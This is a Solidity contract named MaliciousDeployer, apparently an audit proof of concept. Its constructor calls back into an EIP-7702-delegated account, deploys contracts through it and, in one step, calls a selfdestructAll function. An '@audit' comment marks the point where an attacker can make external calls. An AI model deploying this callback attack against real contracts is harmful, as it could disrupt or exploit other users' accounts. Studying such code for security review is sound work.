// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "./DelegationTarget.sol";

/**
 * @title MaliciousDeployer
 * @notice Contract that during deployment calls back the deployer (with EIP-7702 delegation)
 *         and deploys contracts through the delegated EOA
 * @dev The constructor performs the callback attack during deployment
 */
contract MaliciousDeployer {
    address public immutable deployer;
    address[] public deployedContracts;

    event CallbackExecuted(address indexed delegatedEOA, bool success);
    event ContractDeployedViaCallback(address indexed deployed);

    /**
     * @notice Constructor that calls back the deployer and deploys contracts
     * @param delegatedEOA The EOA with EIP-7702 delegation (should be tx.origin or specified)
     * @param numContracts Number of contracts to deploy via callback
     */
    constructor(address delegatedEOA, uint256 numContracts, uint256 step) {
        deployer = msg.sender;

        // Attempt to call back the delegated EOA and deploy contracts through it
        for (uint256 i = 0; i < numContracts; i++) {
            // Get bytecode for MinimalContract
            bytes memory bytecode;
            if (step == 1) {
                bytecode = type(MinimalContract).creationCode;
            } else {
                bytecode = type(FinalContract).creationCode;
            }

            // Call the deploy function on the delegated EOA (which has DelegationTarget code)
            (bool success, bytes memory result) = delegatedEOA.call(
                abi.encodeWithSelector(DelegationTarget.deploy.selector, bytecode)
            );

            emit CallbackExecuted(delegatedEOA, success);
            address deployed;
            if (success && result.length >= 32) {
                deployed = abi.decode(result, (address));
                deployedContracts.push(deployed);
            }
        }

        delegatedEOA.call(abi.encodeWithSelector(DelegationTarget.emitAllCodeHashes.selector));


        // @audit at this point, the attacker can make external calls


        // Call the deploy function on the delegated EOA (which has DelegationTarget code)
        if (step == 1) {
            delegatedEOA.call(
                abi.encodeWithSelector(DelegationTarget.selfdestructAll.selector)
            );
        }
    }

    /**
     * @notice Get the number of contracts deployed via callback
     */
    function getDeployedCount() external view returns (uint256) {
        return deployedContracts.length;
    }

    /**
     * @notice Get all deployed contract addresses
     */
    function getDeployedContracts() external view returns (address[] memory) {
        return deployedContracts;
    }
}
